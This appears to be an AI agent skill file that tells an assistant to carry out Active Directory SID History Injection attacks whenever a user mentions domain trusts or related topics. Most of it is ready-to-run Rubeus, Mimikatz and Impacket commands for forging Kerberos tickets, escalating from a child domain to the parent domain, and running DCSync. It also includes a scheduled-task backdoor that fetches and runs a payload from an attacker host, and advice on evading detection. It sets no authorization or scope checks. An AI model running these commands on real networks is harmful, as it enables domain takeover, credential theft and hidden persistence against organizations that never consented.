---
name: sid-history-injection
description: Active Directory SID History Injection attack methodology. Use this skill whenever the user mentions SID history, domain trust attacks, cross-domain privilege escalation, Golden/Diamond tickets with SIDs, or wants to escalate from child to parent domain in Active Directory. This skill covers finding target SIDs, generating tickets with injected SID history, and escalating privileges across domain trusts.
---

# SID History Injection Attack

This skill helps you execute **SID History Injection attacks** to escalate privileges across Active Directory domain trusts. The attack exploits how Windows handles user migration between domains by injecting high-privilege SIDs (like Enterprise Admins or Domain Admins) into a user's SID History attribute.

## When to Use This Skill

Use this skill when you need to:
- Escalate from a child domain to a parent/root domain
- Exploit domain trust relationships in Active Directory
- Add privileged SIDs to Kerberos tickets (Golden/Diamond tickets)
- Find SIDs of target groups across domains
- Perform cross-domain privilege escalation

## Attack Overview

The SID History Injection attack works by:
1. Finding the SID of a high-privilege group in the target domain (e.g., Enterprise Admins `-519`, Domain Admins `-512`)
2. Creating a Golden or Diamond ticket with that SID injected into the SID History
3. Using the ticket to access resources in the parent domain as if you were a member of that group

## Prerequisites

- Access to a compromised domain with trust relationship to target domain
- KRBTGT hash or AES256 key from the compromised domain
- Domain SID of both current and target domains
- Tools: Rubeus, Mimikatz, or Impacket

## Step 1: Find Target SIDs

### Find Root Domain SID

First, identify the root domain SID. The Enterprise Admins group SID is the root domain SID with `-519` appended. Domain Admins ends with `-512`.

**Using PowerShell (if you have access):**
```powershell
# Find Domain Admins SID in parent domain
Get-DomainGroup -Identity "Domain Admins" -Domain parent.domain.local -Properties ObjectSid

# Find Enterprise Admins SID
Get-DomainGroup -Identity "Enterprise Admins" -Domain parent.domain.local -Properties ObjectSid
```

**Using Impacket (from Linux):**
```bash
# Get child domain SID
lookupsid.py <child_domain>/username@<dc_ip> | grep "Domain SID"

# Get root domain SID (look for Enterprise Admins entry)
lookupsid.py <child_domain>/username@<dc_ip> | grep -B20 "Enterprise Admins" | grep "Domain SID"
```

**SID Format:**
- Root domain SID: `S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX`
- Enterprise Admins: `S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519`
- Domain Admins: `S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-512`

## Step 2: Execute the Attack

### Method A: Diamond Ticket (Rubeus)

Diamond tickets are more sophisticated and harder to detect. Use when you have the KRBTGT AES256 key.

```powershell
# Diamond ticket with SID history injection
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:<parent_domain_sid>-512 /krbkey:<aes256_key> /nowrap /ldap

# Or with Enterprise Admins SID
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:<parent_domain_sid>-519 /krbkey:<aes256_key> /nowrap /ldap
```

**Parameters:**
- `/tgtdeleg` - Creates a TGT that can be delegated
- `/ticketuser` - Username to impersonate
- `/ticketuserid` - User RID (500 for Administrator)
- `/sids` - The SID(s) to inject into SID History
- `/krbkey` - AES256 key of KRBTGT account
- `/ldap` - Query LDAP for domain details
- `/nowrap` - Don't wrap the ticket

### Method B: Golden Ticket (Rubeus)

```powershell
# Golden ticket with SID history
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example with full parameters
Rubeus.exe golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:<krbtgt_ntlm_hash> /sids:S-1-5-21-0987654321-0987654321-0987654321-519 /ptt /ldap /nowrap /printcmd
```

**Parameters:**
- `/rc4` - NTLM hash of KRBTGT account
- `/domain` - Current (child) domain
- `/sid` - Current domain SID
- `/sids` - Target SID(s) to inject
- `/user` - Username (can be anything)
- `/ptt` - Pass-the-ticket (loads into memory)
- `/printcmd` - Print the command for offline use

### Method C: Golden Ticket (Mimikatz)

```powershell
# Mimikatz golden ticket with SID history
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<target_group_sid> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

# Or with NTLM hash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<target_group_sid> /krbtgt:<ntlm_hash> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
```

**Parameters:**
- `/user` - Username to impersonate
- `/domain` - Current domain
- `/sid` - Current domain SID
- `/sids` - Target SID(s) to inject into SID History
- `/aes256` or `/krbtgt` - KRBTGT account key
- `/startoffset` - Ticket start time (minutes before now)
- `/endin` - Ticket expiry (minutes)
- `/renewmax` - Maximum renewal time (minutes)
- `/ticket` - Output file path

### Method D: From Linux (Impacket)

**Using ticketer.py:**
```bash
# Generate golden ticket with SID history
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <parent_domain_sid>-519 Administrator

# Load the ticket
export KRB5CCNAME=hacker.ccache

# Execute commands in parent domain
psexec.py <child_domain>/Administrator@dc.parent.local -k -no-pass -target-ip <dc_ip>
```

**Using raiseChild.py (Automated):**
```bash
# Automated child-to-parent escalation
raiseChild.py -target-exec <parent_dc_ip> <child_domain>/username

# Without auto-execution
raiseChild.py <child_domain>/username
```

**What raiseChild.py does:**
1. Obtains Enterprise Admins SID from parent domain
2. Retrieves KRBTGT hash from child domain
3. Creates Golden Ticket with SID history
4. Logs into parent domain
5. Retrieves Administrator credentials from parent
6. Optionally executes via psexec

## Step 3: Post-Exploitation

Once you have the ticket loaded, you can:

**Access parent domain resources:**
```powershell
# List shares on parent domain DC
ls \\parent-dc.parent.local\c$

# Query parent domain
Get-ADComputer -Server parent-dc.parent.local
```

**Perform DCSync on parent domain:**
```powershell
# DCSync from parent domain
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:parent.domain.local /user:Administrator"'
```

**Create scheduled task on parent DC:**
```powershell
schtasks /create /S parent-dc.parent.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "BackdoorTask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(\'http://<attacker_ip>/payload.ps1\')'"

# Run the task
schtasks /Run /S parent-dc.parent.local /TN "BackdoorTask"
```

## Important Considerations

### SID History Filtering

Some organizations disable SID History on trust relationships:

- **Forest trusts:** `netdom trust /domain:<domain> /EnableSIDHistory:no`
- **External trusts:** `netdom trust /domain:<domain> /quarantine:yes`
- **Domain trusts:** SID filtering is unsupported and can cause issues

**Detection:** If the attack fails, SID History may be disabled on the trust.

### Best Practices

1. **Use Diamond tickets when possible** - More sophisticated, harder to detect
2. **Inject multiple SIDs** - Add both Domain Admins (-512) and Enterprise Admins (-519)
3. **Set appropriate ticket times** - Use `/startoffset:-10` to avoid clock skew issues
4. **Test in isolated environment first** - Verify the trust relationship allows SID History
5. **Clean up** - Remove any artifacts after the engagement

### Detection Evasion

- Use `/ldap` flag with Rubeus to query domain details dynamically
- Set realistic ticket validity periods
- Avoid obvious usernames like "Administrator" in production
- Consider using `/printcmd` to generate tickets offline

## Troubleshooting

**"The user name or password is incorrect"**
- Verify the KRBTGT hash/key is correct
- Check domain SID is accurate
- Ensure trust relationship exists

**"SID History is disabled"**
- The trust may have SID History filtering enabled
- Try alternative attack methods (DCSync, resource-based constrained delegation)

**Ticket not loading**
- Ensure `/ptt` flag is used (Rubeus) or ticket is loaded (Mimikatz)
- Check Kerberos cache: `klist` or `klist.exe`

## References

- [ADSecurity - SID History Injection](https://adsecurity.org/?p=1772)
- [SentinelOne - SID History Exposure](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [ITM8 - SID Filter Bypass](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [Microsoft - SID History Documentation](https://technet.microsoft.com/library/cc835085.aspx)
